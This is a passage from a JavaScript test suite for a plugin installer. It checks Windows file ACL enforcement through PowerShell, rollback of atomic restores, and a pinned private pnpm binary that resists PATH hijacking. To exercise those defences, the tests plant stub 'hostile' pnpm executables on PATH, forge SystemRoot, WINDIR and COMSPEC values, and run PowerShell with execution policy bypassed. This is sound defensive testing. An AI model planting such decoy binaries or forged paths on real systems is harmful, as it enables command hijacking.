  await rm(guardRoot, { recursive: true });
});

function fakeWindowsStat(kind, volumeSerial, fileIndex) {
  return {
    dev: BigInt(volumeSerial),
    ino: BigInt(fileIndex),
    nlink: 1n,
    isDirectory: () => kind === 'directory',
    isFile: () => kind === 'file',
    isSymbolicLink: () => false,
  };
}

const WINDOWS_SYSTEM_ROOT_FOR_TESTING = String.raw`C:\Windows`;
const WINDOWS_POWERSHELL_TEMP_FOR_TESTING = String.raw`C:\private\powershell-temp`;

function windowsSystemRootTestOptions() {
  return process.platform === 'win32'
    ? {}
    : {
        powerShellTempForTesting: WINDOWS_POWERSHELL_TEMP_FOR_TESTING,
        systemRootForTesting: WINDOWS_SYSTEM_ROOT_FOR_TESTING,
      };
}

function windowsAclProof(kind, volumeSerial, fileIndex, overrides = {}) {
  return {
    schemaVersion: 3,
    kind,
    volumeSerial: String(volumeSerial),
    fileIndex: String(fileIndex),
    fileSystem: 'NTFS',
    currentSid: 'S-1-5-21-1000',
    ownerSid: 'S-1-5-21-1000',
    protected: true,
    ruleCount: 1,
    ruleSid: 'S-1-5-21-1000',
    inherited: false,
    allow: true,
    fullControl: true,
    inheritanceFlags: kind === 'directory' ? 3 : 0,
    propagationFlags: 0,
    shareMode: 1,
    ...overrides,
  };
}

test('Windows recovery ACL runner binds a native handle identity and validates SID-only proof', {
  skip: process.platform === 'win32',
}, async () => {
  const calls = [];
  const expectedIdentity = { volumeSerial: '41', fileIndex: '9001' };
  const systemRootOptions = windowsSystemRootTestOptions();
  const trustedSystemRoot = trustedWindowsSystemRoot({
    platform: 'win32',
    ...systemRootOptions,
  });
  const lstatPath = async () => fakeWindowsStat('directory', 41, 9001);
  const execute = async (...args) => {
    calls.push(args);
    const options = args[2];
    return {
      stdout: `${JSON.stringify(windowsAclProof(
        'directory',
        options.env.DSH_PLUGIN_PRIVATE_VOLUME_SERIAL,
        options.env.DSH_PLUGIN_PRIVATE_FILE_INDEX
      ))}\n`,
      stderr: '',
    };
  };
  const proof = await secureWindowsPrivatePath(
    'C:\\private\\trust-root',
    'directory',
    'configure',
    {
      environment: {
        SystemRoot: 'Z:\\forged-system-root',
        WINDIR: 'Y:\\different-forged-system-root',
        TEMP: 'C:\\Temp',
        SECRET_TOKEN: 'must-not-cross-boundary',
      },
      execute,
      expectedIdentity,
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }
  );
  assert.equal(proof.ruleSid, proof.currentSid);
  assert.equal(WINDOWS_PRIVATE_ACL_TIMEOUT_MS, 60_000);
  assert.equal(calls.length, 1);
  const [executable, args, options] = calls[0];
  assert.equal(
    executable,
    `${trustedSystemRoot}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
  );
  assert.deepEqual(args.slice(0, 6), [
    '-NoLogo', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command',
  ]);
  assert.equal(args[6], WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT);
  assert.equal(options.timeout, WINDOWS_PRIVATE_ACL_TIMEOUT_MS);
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_PATH, 'C:\\private\\trust-root');
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_KIND, 'directory');
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_ACTION, 'configure');
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_VOLUME_SERIAL, '41');
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_FILE_INDEX, '9001');
  assert.equal(options.env.SystemRoot, trustedSystemRoot);
  assert.equal(options.env.WINDIR, trustedSystemRoot);
  assert.equal(options.env.TEMP, WINDOWS_POWERSHELL_TEMP_FOR_TESTING);
  assert.equal(options.env.TMP, WINDOWS_POWERSHELL_TEMP_FOR_TESTING);
  assert.equal(options.env.SECRET_TOKEN, undefined);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /CreateFileW/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /GetFileInformationByHandle/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /GetVolumeInformationByHandleW/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /"NTFS"/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /SetSecurityInfo/u);
  assert.match(
    WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT,
    /uint shareMode = FileShareRead \| \(openWriter \? FileShareWrite : 0\)/u
  );
  assert.doesNotMatch(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FileShareDelete/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /SetAccessRuleProtection\(true, false\)/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /rules\.Count == 1/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FileSystemRights\.FullControl/u);
  assert.equal(
    WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT.includes(
      String.raw`return "\\\\?\\" + normalized;`
    ),
    true
  );
  assert.doesNotMatch(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /S-1-5-18/);
  assert.doesNotMatch(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /Add-Type/u);
  assert.doesNotMatch(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /\.SetAccessControl\(/u);
  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /DriveFormat/u);
  assert.match(
    WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT,
    /\$directory\.Create\(\$security\)/u
  );
  assert.doesNotMatch(
    WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT,
    /\[IO\.Directory\]::CreateDirectory/u
  );
  assert.match(
    WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT,
    /DeleteSubdirectoriesAndFiles/u
  );
  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /CreateDirectories/u);
  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /ChangePermissions/u);
  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /TakeOwnership/u);
  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /S-1-5-32-544/u);
  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /checkedAncestorCount/u);
  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /SetAccessRuleProtection\(\$true, \$false\)/u);
  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /GetCurrent\(\)\.User/u);

  await assert.rejects(
    () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
      environment: { SystemRoot: 'C:\\Windows' },
      execute: async () => ({
        stdout: `${JSON.stringify(windowsAclProof(
          'directory',
          41,
          9001,
          { ownerSid: 'S-1-5-18' }
        ))}\n`,
        stderr: '',
      }),
      expectedIdentity,
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }),
    /malformed or weaker/
  );

  await assert.rejects(
    () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
      environment: {},
      execute: async () => ({
        stdout: `${JSON.stringify(windowsAclProof(
          'directory',
          41,
          9001,
          { shareMode: 3 }
        ))}\n`,
        stderr: '',
      }),
      expectedIdentity,
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }),
    /malformed or weaker/
  );

  let inspection = 0;
  await assert.rejects(
    () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
      environment: { SystemRoot: 'C:\\Windows' },
      execute: async () => ({
        stdout: `${JSON.stringify(windowsAclProof('directory', 41, 9001))}\n`,
        stderr: '',
      }),
      expectedIdentity,
      lstatPath: async () => {
        inspection += 1;
        return inspection === 1
          ? fakeWindowsStat('directory', 41, 9001)
          : fakeWindowsStat('directory', 41, 9002);
      },
      platform: 'win32',
      ...systemRootOptions,
    }),
    /target changed during verification/
  );

  await assert.rejects(
    () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
      environment: {},
      execute: async () => ({
        stdout: `${JSON.stringify(windowsAclProof(
          'directory',
          41,
          9001,
          { fileSystem: 'ReFS' }
        ))}\n`,
        stderr: '',
      }),
      expectedIdentity,
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }),
    /malformed or weaker/
  );

  const longTarget = `C:\\private\\${'a'.repeat(300)}`;
  await secureWindowsPrivatePath(longTarget, 'directory', 'verify', {
    environment: {},
    execute,
    expectedIdentity,
    lstatPath,
    platform: 'win32',
    ...systemRootOptions,
  });
  assert.equal(calls.at(-1)[2].env.DSH_PLUGIN_PRIVATE_PATH, longTarget);
  await assert.rejects(
    () => secureWindowsPrivatePath('\\\\server\\share\\private', 'directory', 'verify', {
      environment: {},
      execute,
      expectedIdentity,
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }),
    /local drive-absolute/
  );
  await assert.rejects(
    () => secureWindowsPrivatePath(`C:\\${'a'.repeat(32_760)}`, 'directory', 'verify', {
      environment: {},
      execute,
      expectedIdentity,
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }),
    /too long/
  );

  if (process.platform === 'win32') {
    assert.throws(
      () => trustedWindowsSystemRoot({
        platform: 'win32',
        systemRootForTesting: 'D:\\forged-system-root',
      }),
      /cannot be overridden/
    );
  } else {
    assert.equal(
      trustedWindowsSystemRootFromCandidates([
        { name: 'kernel32', value: 'C:\\Windows' },
        { name: 'ntdll', value: 'c:\\WINDOWS\\' },
      ]),
      'C:\\Windows'
    );
    assert.throws(
      () => trustedWindowsSystemRootFromCandidates([
        { name: 'kernel32', value: 'C:\\Windows' },
        { name: 'ntdll', value: 'D:\\Windows' },
      ]),
      /system roots disagree/
    );
    assert.equal(
      windowsPowerShellTempParentFromEnvironment({
        TEMP: 'C:\\Temp',
        temp: 'c:\\TEMP\\',
        TMP: 'C:\\TEMP',
      }),
      'C:\\Temp'
    );
    assert.equal(
      windowsPowerShellTempParentFromEnvironment({
        LOCALAPPDATA: 'C:\\Users\\Fixture\\AppData\\Local',
        TEMP: 'D:\\Shared\\Temp',
        TMP: 'D:\\Shared\\Temp',
      }),
      'C:\\Users\\Fixture\\AppData\\Local\\Temp'
    );
    assert.equal(
      windowsPowerShellTempParentFromEnvironment({
        LOCALAPPDATA: 'C:\\Users\\Fixture\\AppData\\Local',
        localappdata: 'c:\\USERS\\FIXTURE\\APPDATA\\LOCAL\\',
        TEMP: 'C:\\Users\\Fixture\\AppData\\Local\\Temp',
        TMP: 'c:\\USERS\\FIXTURE\\APPDATA\\LOCAL\\TEMP\\',
      }),
      'C:\\Users\\Fixture\\AppData\\Local\\Temp'
    );
    assert.throws(
      () => windowsPowerShellTempParentFromEnvironment({
        LOCALAPPDATA: 'C:\\Users\\Fixture\\AppData\\Local',
        localappdata: 'D:\\Other\\Local',
        TEMP: 'C:\\Temp',
      }),
      /ambiguous Windows LOCALAPPDATA entries/u
    );
    assert.throws(
      () => windowsPowerShellTempParentFromEnvironment({
        LOCALAPPDATA: '\\\\server\\share\\Local',
        TEMP: 'C:\\Temp',
      }),
      /local drive-absolute/u
    );
    assert.throws(
      () => windowsPowerShellTempParentFromEnvironment({
        TEMP: 'C:\\Temp',
        temp: 'D:\\Temp',
      }),
      /ambiguous Windows TEMP entries/u
    );
    assert.throws(
      () => windowsPowerShellTempParentFromEnvironment({
        TEMP: '\\\\server\\share\\temp',
      }),
      /local drive-absolute/u
    );
    for (const systemRootForTesting of [
      'C:Windows',
      '\\Windows',
      '\\\\server\\share\\Windows',
      '\\\\.\\C:\\Windows',
    ]) {
      assert.throws(
        () => trustedWindowsSystemRoot({ platform: 'win32', systemRootForTesting }),
        /local drive-absolute/
      );
    }
  }
});

test('Windows strict ACL verification excludes an inherited writer until it closes', {
  skip: process.platform !== 'win32',
}, async (t) => {
  const root = await realpath(await workspace(t));
  const path = join(root, 'open-writer.key');
  const handle = await open(path, 'wx', 0o600);
  const expectedIdentity = await captureWindowsPrivatePathIdentity(path, 'file');
  try {
    const temporaryProof = await secureWindowsPrivatePath(
      path,
      'file',
      'configure-open-writer',
      { expectedIdentity }
    );
    assert.equal(temporaryProof.shareMode, 3);
    await assert.rejects(
      () => secureWindowsPrivatePath(path, 'file', 'verify', { expectedIdentity }),
      /failed to enforce current-user SID-only Windows ACL/
    );
  } finally {
    await handle.close();
  }
  const strictProof = await secureWindowsPrivatePath(
    path,
    'file',
    'verify',
    { expectedIdentity }
  );
  assert.equal(strictProof.shareMode, 1);
});

test('Windows strict ACL verification rejects a live read-write file mapping', {
  skip: process.platform !== 'win32',
}, async (t) => {
  const root = await realpath(await workspace(t));
  const path = join(root, 'mapped-writer.key');
  await writeFile(path, Buffer.alloc(4096));
  const expectedIdentity = await captureWindowsPrivatePathIdentity(path, 'file');
  await secureWindowsPrivatePath(path, 'file', 'configure', { expectedIdentity });
  const systemRoot = trustedWindowsSystemRoot();
  const powershell = join(
    systemRoot,
    'System32',
    'WindowsPowerShell',
    'v1.0',
    'powershell.exe'
  );
  const mappingScript = String.raw`
$ErrorActionPreference = 'Stop'
$stream = [IO.File]::Open(
  $env:DSH_TEST_MAPPED_FILE,
  [IO.FileMode]::Open,
  [IO.FileAccess]::ReadWrite,
  [IO.FileShare]::Read)
$mapping = [IO.MemoryMappedFiles.MemoryMappedFile]::CreateFromFile(
  $stream, $null, 0,
  [IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWrite,
  [IO.HandleInheritability]::None, $false)
$view = $mapping.CreateViewAccessor()
[Console]::WriteLine('ready')
[void][Console]::In.ReadLine()
$view.Dispose()
$mapping.Dispose()
$stream.Dispose()
`;
  const child = spawn(powershell, [
    '-NoLogo', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass',
    '-Command', mappingScript,
  ], {
    env: {
      SystemRoot: systemRoot,
      WINDIR: systemRoot,
      DSH_TEST_MAPPED_FILE: path,
    },
    stdio: ['pipe', 'pipe', 'pipe'],
    windowsHide: true,
  });
  t.after(() => {
    if (child.exitCode === null) child.kill();
  });
  await new Promise((resolve, reject) => {
    let stderr = '';
    let settled = false;
    const finish = (callback, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      callback(value);
    };
    const timer = setTimeout(() => {
      finish(reject, new Error('mapped writer did not become ready'));
    }, 10_000);
    child.stderr.on('data', (chunk) => { stderr += chunk.toString('utf8'); });
    child.once('error', (error) => finish(reject, error));
    child.once('exit', (code) => finish(reject, new Error(
      `mapped writer exited before readiness (${code}): ${stderr}`
    )));
    child.stdout.once('data', (chunk) => {
      if (chunk.toString('utf8').trim() !== 'ready') {
        finish(reject, new Error('mapped writer emitted malformed readiness'));
      } else {
        finish(resolve);
      }
    });
  });
  await assert.rejects(
    () => secureWindowsPrivatePath(path, 'file', 'verify', { expectedIdentity }),
    /failed to enforce current-user SID-only Windows ACL/u
  );
  const exited = once(child, 'exit');
  child.stdin.end('release\n');
  const [code] = await exited;
  assert.equal(code, 0);
  const proof = await secureWindowsPrivatePath(path, 'file', 'verify', { expectedIdentity });
  assert.equal(proof.shareMode, 1);
});

test('Windows private ACL batches amortize one bounded PowerShell process without weakening proofs', {
  skip: process.platform === 'win32',
}, async () => {
  const calls = [];
  const systemRootOptions = windowsSystemRootTestOptions();
  const trustedSystemRoot = trustedWindowsSystemRoot({
    platform: 'win32',
    ...systemRootOptions,
  });
  const requests = [
    {
      path: 'C:\\private\\transaction',
      kind: 'directory',
      action: 'verify',
      expectedIdentity: { volumeSerial: '52', fileIndex: '7001' },
    },
    {
      path: 'C:\\private\\transaction\\state.json',
      kind: 'file',
      action: 'configure',
      expectedIdentity: { volumeSerial: '52', fileIndex: '7002' },
    },
  ];
  const lstatPath = async (path) => path.endsWith('.json')
    ? fakeWindowsStat('file', 52, 7002)
    : fakeWindowsStat('directory', 52, 7001);
  const proofs = await secureWindowsPrivatePaths(requests, {
    environment: {
      SystemRoot: 'Z:\\forged-system-root',
      WINDIR: 'Y:\\different-forged-system-root',
      TEMP: 'C:\\Temp',
      SECRET_TOKEN: 'must-not-cross-boundary',
    },
    execute: async (...args) => {
      calls.push(args);
      const bound = JSON.parse(Buffer.from(
        args[2].env.DSH_PLUGIN_PRIVATE_BATCH,
        'base64'
      ).toString('utf8'));
      return {
        stdout: `${JSON.stringify(bound.map((request) => windowsAclProof(
          request.kind,
          request.volumeSerial,
          request.fileIndex
        )))}\n`,
        stderr: '',
      };
    },
    lstatPath,
    platform: 'win32',
    ...systemRootOptions,
  });
  assert.equal(calls.length, 1);
  assert.equal(proofs.length, 2);
  assert.equal(proofs[0].inheritanceFlags, 3);
  assert.equal(proofs[1].inheritanceFlags, 0);
  const [, args, options] = calls[0];
  assert.equal(args[6], WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT);
  assert.equal(options.timeout, WINDOWS_PRIVATE_ACL_TIMEOUT_MS);
  assert.equal(options.env.DSH_PLUGIN_PRIVATE_PATH, undefined);
  assert.equal(options.env.SECRET_TOKEN, undefined);
  assert.equal(options.env.SystemRoot, trustedSystemRoot);
  assert.equal(options.env.WINDIR, trustedSystemRoot);
  assert.equal(options.env.TEMP, WINDOWS_POWERSHELL_TEMP_FOR_TESTING);
  assert.equal(options.env.TMP, WINDOWS_POWERSHELL_TEMP_FOR_TESTING);
  assert.deepEqual(
    JSON.parse(Buffer.from(options.env.DSH_PLUGIN_PRIVATE_BATCH, 'base64').toString('utf8')),
    requests.map(({ expectedIdentity, ...request }) => ({
      ...request,
      volumeSerial: expectedIdentity.volumeSerial,
      fileIndex: expectedIdentity.fileIndex,
    }))
  );
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FromBase64String\(\$batch\)/);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /foreach \(\$request in \$requests\)/);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /SetAccessRuleProtection\(true, false\)/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /rules\.Count == 1/u);
  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FileSystemRights\.FullControl/u);
  assert.doesNotMatch(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /S-1-5-18/);

  await assert.rejects(
    () => secureWindowsPrivatePaths([], {
      environment: { SystemRoot: 'C:\\Windows' },
      platform: 'win32',
    }),
    /batch is malformed/
  );
  await assert.rejects(
    () => secureWindowsPrivatePaths(requests, {
      environment: { SystemRoot: 'C:\\Windows' },
      execute: async () => ({
        stdout: `${JSON.stringify([windowsAclProof('directory', 52, 7001)])}\n`,
        stderr: '',
      }),
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }),
    /proof count is invalid/
  );
  await assert.rejects(
    () => secureWindowsPrivatePaths(requests, {
      environment: { SystemRoot: 'C:\\Windows' },
      execute: async () => ({
        stdout: `${JSON.stringify([
          windowsAclProof('directory', 52, 7001),
          windowsAclProof('file', 52, 7002, { ownerSid: 'S-1-5-18' }),
        ])}\n`,
        stderr: '',
      }),
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }),
    /malformed or weaker/
  );
  await assert.rejects(
    () => secureWindowsPrivatePaths([
      {
        path: 'C:\\private\\transaction\\state.json',
        kind: 'file',
        action: 'verify',
        expectedIdentity: { volumeSerial: '52', fileIndex: '7999' },
      },
    ], {
      environment: { SystemRoot: 'C:\\Windows' },
      execute: async () => {
        throw new Error('executor must not run for a caller/path identity mismatch');
      },
      lstatPath,
      platform: 'win32',
      ...systemRootOptions,
    }),
    /differs from caller-bound identities/
  );
  await assert.rejects(
    () => secureWindowsPrivatePaths([
      { path: 'C:\\private\\transaction', kind: 'directory', action: 'verify' },
    ], {
      environment: { SystemRoot: 'C:\\Windows' },
      lstatPath,
      platform: 'win32',
    }),
    /batch is malformed/
  );
  await assert.rejects(
    () => secureWindowsPrivatePaths(Array.from({ length: 33 }, () => requests[0]), {
      environment: { SystemRoot: 'C:\\Windows' },
      platform: 'win32',
    }),
    /batch is malformed/
  );
});

test('Windows recovery batching keeps handles open across ACL proof and preserves terminal-marker isolation', async () => {
  const transactionSource = await readFile(
    new URL('../skills/dsh-plugin-installer/scripts/install-transaction.mjs', import.meta.url),
    'utf8'
  );
  const snapshotSource = await readFile(
    new URL('../skills/dsh-plugin-installer/scripts/profile-snapshot.mjs', import.meta.url),
    'utf8'
  );
  assert.match(transactionSource, /const prepared = \[\];[\s\S]*await open\(specification\.path, flags\)/);
  assert.match(transactionSource, /await secureWindowsPrivatePaths\(aclRequests\)/);
  assert.match(transactionSource, /samePrivateFileState\(entry\.stat, afterAcl\)/);
  assert.match(transactionSource, /terminalMarkerPresent[\s\S]*recovery-auth\.json[\s\S]*in-progress\.json/);
  assert.match(transactionSource, /windowsDirectories: \[[\s\S]*source transaction root[\s\S]*source transaction snapshot/);
  assert.match(snapshotSource, /privateWriteBatch\(writes\)/);
  assert.match(snapshotSource, /secureWindowsPrivatePaths\(\[[\s\S]*entryStates/);
  assert.match(snapshotSource, /holdWindowsHandle: process\.platform === 'win32'/);
  assert.match(snapshotSource, /expectedIdentity: state\.windowsBinding\.identity/);
  assert.match(snapshotSource, /sameWindowsSnapshotFile\([\s\S]{0,80}state\.windowsBinding/);
});

test('Windows atomic restore secures an empty temp before writing and retains backup through target verification', async (t) => {
  const root = await realpath(await workspace(t));
  const target = join(root, 'managed.yaml');
  await writeFile(target, 'original\n');
  const events = [];
  let id = 0;
  const openFile = async (...args) => {
    const handle = await open(...args);
    return {
      writeFile: async (...writeArgs) => {
        events.push('write-temp');
        return handle.writeFile(...writeArgs);
      },
      sync: async () => {
        events.push('sync-temp');
        return handle.sync();
      },
      stat: (...statArgs) => handle.stat(...statArgs),
      close: () => handle.close(),
    };
  };
  const securePath = async (path, kind, action) => {
    events.push(`acl-${action}-${path === target ? 'target' : 'temp'}`);
    assert.equal(kind, 'file');
  };
  const renamePath = async (from, to) => {
    events.push(`rename-${from === target ? 'original' : 'temp'}-${to === target ? 'target' : 'backup'}`);
    return rename(from, to);
  };
  const removePath = async (path, options) => {
    events.push(`remove-${path === target ? 'target' : path.endsWith('.bak') ? 'backup' : 'temp'}`);
    return rm(path, options);
  };

  await atomicRestoreWrite(target, Buffer.from('restored\n'), null, {
    platform: 'win32',
    securePath,
    openFile,
    renamePath,
    removePath,
    randomId: () => (++id === 1 ? 'temporary' : 'backup'),
  });
  assert.equal(await readFile(target, 'utf8'), 'restored\n');
  assert.ok(events.indexOf('acl-configure-open-writer-temp') < events.indexOf('write-temp'));
  assert.ok(events.indexOf('write-temp') < events.indexOf('acl-verify-temp'));
  assert.ok(events.indexOf('sync-temp') < events.indexOf('rename-original-backup'));
  assert.ok(events.indexOf('acl-verify-temp') < events.indexOf('rename-original-backup'));
  assert.ok(events.indexOf('rename-temp-target') < events.indexOf('acl-verify-target'));
  assert.ok(events.indexOf('acl-verify-target') < events.indexOf('remove-backup'));
});

test('Windows atomic restore rolls back a failed target ACL verification, including absent originals', async (t) => {
  const root = await realpath(await workspace(t));
  const existingTarget = join(root, 'existing.yaml');
  const absentTarget = join(root, 'absent.yaml');
  await writeFile(existingTarget, 'original\n');
  const failingAcl = async (path, _kind, action) => {
    if ((path === existingTarget || path === absentTarget) && action === 'verify') {
      throw new Error('simulated final ACL verification failure');
    }
  };

  await assert.rejects(
    () => atomicRestoreWrite(existingTarget, Buffer.from('unsafe replacement\n'), null, {
      platform: 'win32',
      securePath: failingAcl,
      renamePath: rename,
    }),
    /simulated final ACL verification failure/
  );
  assert.equal(await readFile(existingTarget, 'utf8'), 'original\n');

  await assert.rejects(
    () => atomicRestoreWrite(absentTarget, Buffer.from('unsafe new target\n'), null, {
      platform: 'win32',
      securePath: failingAcl,
      renamePath: rename,
    }),
    /simulated final ACL verification failure/
  );
  await assert.rejects(() => lstat(absentTarget), { code: 'ENOENT' });
});

test('private pnpm binding uses only the vendored 11.7.0 closure and defeats PATH pnpm', async (t) => {
  const root = await realpath(await workspace(t));
  const hostileBin = join(root, 'hostile-bin');
  const lateHostileBin = join(root, 'late-hostile-bin');
  const profileCwd = join(root, 'profile-cwd');
  const runtimeRoot = join(root, 'runtime');
  await mkdir(hostileBin);
  await mkdir(lateHostileBin);
  await mkdir(profileCwd);
  await mkdir(runtimeRoot);
  const hostileName = process.platform === 'win32' ? 'pnpm.exe' : 'pnpm';
  await writeFile(join(hostileBin, hostileName), 'hostile PATH pnpm\n', { mode: 0o700 });
  await writeFile(
    join(profileCwd, hostileName),
    process.platform === 'win32'
      ? 'hostile cwd pnpm.exe\r\n'
      : '#!/bin/sh\nprintf "99.0.0\\n"\n',
    { mode: 0o700 }
  );
  const trustedSystemRoot = process.platform === 'win32'
    ? await realpath(trustedWindowsSystemRoot())
    : undefined;
  const environment = {
    PATH: [hostileBin, lateHostileBin].join(
      process.platform === 'win32' ? ';' : delimiter
    ),
    PATHEXT: '.EXE;.CMD;.COM;.BAT',
    SystemRoot: process.platform === 'win32'
      ? join(profileCwd, 'forged-system-root')
      : process.env.SystemRoot,
    WINDIR: process.platform === 'win32'
      ? join(profileCwd, 'different-forged-system-root')
      : process.env.WINDIR,
    COMSPEC: process.platform === 'win32'
      ? join(profileCwd, 'untrusted-command-processor.exe')
      : process.env.COMSPEC,
    ...(process.platform === 'win32' && process.env.LOCALAPPDATA
      ? { LOCALAPPDATA: process.env.LOCALAPPDATA }
      : {}),
    TEMP: process.env.TEMP ?? tmpdir(),
    TMP: process.env.TMP ?? tmpdir(),
  };
  const binding = await createPrivatePnpmBinding(environment, runtimeRoot, {
    commandCwd: profileCwd,
  });
  assert.equal(binding.receipt.version, '11.7.0');
  assert.equal(
    binding.receipt.artifactSha256,
    'deafa7ec98a1218b6a047289b92fbe2395c1e22d3495bb711653013218ee15ee'
  );
  assert.equal(binding.receipt.closureEntries, 449);
  assert.equal(binding.receipt.schemaVersion, 3);
  assert.equal(binding.receipt.callerPathPolicy, 'discarded-without-filesystem-resolution');
  assert.equal(binding.receipt.discardedCallerPathEntries, 2);
  assert.equal(binding.receipt.privatePathPrecedence, true);
  assert.equal(
    binding.environment.PATH,
    join(runtimeRoot, 'pnpm-binding')
  );
  assert.equal(binding.environment.PATH.includes(hostileBin), false);
  assert.equal(binding.environment.PATH.includes(lateHostileBin), false);
  assert.equal(
    binding.environment.NoDefaultCurrentDirectoryInExePath,
    process.platform === 'win32' ? '1' : undefined
  );
  if (process.platform === 'win32') {
    assert.equal(binding.environment.PATHEXT, '.CMD;.EXE;.COM;.BAT');
    assert.equal(binding.environment.SystemRoot, trustedSystemRoot);
    assert.equal(binding.environment.WINDIR, trustedSystemRoot);
    assert.equal(
      binding.environment.COMSPEC,
      await realpath(join(trustedSystemRoot, 'System32', 'cmd.exe'))
    );
  }
  await writeFile(
    join(lateHostileBin, hostileName),
    process.platform === 'win32'
      ? 'late hostile pnpm.exe\r\n'
      : '#!/bin/sh\nprintf "98.0.0\\n"\n',
    { mode: 0o700 }
  );
  const before = spawnSync('pnpm', ['--version'], {
    cwd: profileCwd,
    encoding: 'utf8',
    env: binding.environment,
    shell: process.platform === 'win32',
    windowsHide: true,
  });
  assert.equal(before.status, 0);
  assert.equal(before.stdout.trim(), '11.7.0');

  const fixture = await realpath(new URL('./fixtures/deep-ocean-1.2.0.tgz', import.meta.url));
  await writeFile(join(profileCwd, 'package.json'), JSON.stringify({
    name: 'private-pnpm-semantics',
    version: '1.0.0',
    private: true,
  }, null, 2));
  const add = spawnSync(binding.environment.DSH_PLUGIN_PNPM_NODE, [
    binding.environment.DSH_PLUGIN_PNPM_CLI,
    'add',
    '--save-exact',
    '--ignore-scripts',
    '--lockfile-only',
    '--ignore-pnpmfile',
    '--',
    fixture,
  ], {
    cwd: profileCwd,
    encoding: 'utf8',
    env: binding.environment,
    shell: false,
    timeout: 30_000,
    windowsHide: true,
  });
  assert.equal(add.status, 0, add.stderr);
  assert.match(
    JSON.parse(await readFile(join(profileCwd, 'package.json'), 'utf8'))
      .dependencies['@dsh-themes/deep-ocean'],
    /^file:.*deep-ocean-1\.2\.0\.tgz$/u
  );
  const removeResult = spawnSync(binding.environment.DSH_PLUGIN_PNPM_NODE, [
    binding.environment.DSH_PLUGIN_PNPM_CLI,
    'remove',
    '--lockfile-only',
    '--',
    '@dsh-themes/deep-ocean',
  ], {
    cwd: profileCwd,
    encoding: 'utf8',
    env: binding.environment,
    shell: false,
    timeout: 30_000,
    windowsHide: true,
  });
  assert.equal(removeResult.status, 0, removeResult.stderr);
  assert.equal(
    JSON.parse(await readFile(join(profileCwd, 'package.json'), 'utf8')).dependencies,
    undefined
  );

  await writeFile(binding.environment.DSH_PLUGIN_PNPM_CLI, 'tampered private CLI\n');
  const after = spawnSync('pnpm', ['--version'], {
    cwd: profileCwd,
    encoding: 'utf8',
    env: binding.environment,
    shell: process.platform === 'win32',
    windowsHide: true,
  });
  assert.notEqual(after.status, 0);
  assert.match(after.stderr, /private pnpm CLI changed/);
  assert.doesNotMatch(after.stderr, new RegExp(hostileBin.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&')));
});

test('vendored pnpm authority binds the official tarball and rejects byte or closure drift', async () => {
  const { authority } = await loadPnpmRuntimeAuthority();
  const artifact = await readFile(new URL(
    '../skills/dsh-plugin-installer/assets/pnpm-runtime/pnpm-11.7.0.tgz',
    import.meta.url
  ));
